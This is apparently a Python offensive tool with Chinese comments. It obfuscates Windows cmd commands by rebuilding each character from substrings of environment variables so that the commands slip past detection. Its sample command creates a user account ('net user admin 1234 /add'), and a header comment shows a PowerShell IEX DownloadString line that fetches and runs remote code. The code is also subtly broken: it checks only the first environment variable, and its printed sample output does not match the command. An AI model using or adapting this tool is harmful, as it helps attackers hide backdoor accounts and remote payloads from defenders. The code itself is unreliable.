###
# 利用windows环境变量混淆cmd命令
# @author ahisec
# @version 1.0
# @date 2021-04-26
# 对于http会解析错误，建议输入一个特殊的字符进行手动替换。
# 例如:echo IEX(New-Object Net.WebClient).DownloadString('y');Ladon whoami | powershell -
#
import os

def find_str(strings):
    env=["CommonProgramFiles","OS"]
    for i in env:
        CommonProgramFiles= os.getenv(i).lower()

        # print(CommonProgramFiles)
        # 查找字符'strings'的位置
        position = CommonProgramFiles.find(strings)
       

        # 检查是否找到了字符
        if position != -1:
            print("字符串:{},环境变量{}".format(strings,i))
            return ("%{}:~{},1%".format(i,position))
        else:
            print("未匹配到字符:{}".format(strings))
            return strings

if __name__ == "__main__":
    new_cmd = ""
    cmd = """net user admin 1234 /add"""
    #输出结果:%commonprogramfiles:~22,1%%commonprogramfiles:~14,1%t%commonprogramfiles:~10,1%u%commonprogramfiles:~15,1%%commonprogramfiles:~14,1%%commonprogramfiles:~4,1%%commonprogramfiles:~10,1%%commonprogramfiles:~0,1%%commonprogramfiles:~8,1%%commonprogramfiles:~12,1%zh%commonprogramfiles:~12,1%%commonprogramfiles:~6,1%%commonprogramfiles:~8,1%%commonprogramfiles:~22,1%%commonprogramfiles:~6,1%%commonprogramfiles:~10,1%1234%commonprogramfiles:~10,1%/%commonprogramfiles:~8,1%dd
    for i in cmd:
        new_cmd = new_cmd + find_str(i)

    print(new_cmd.lower())    
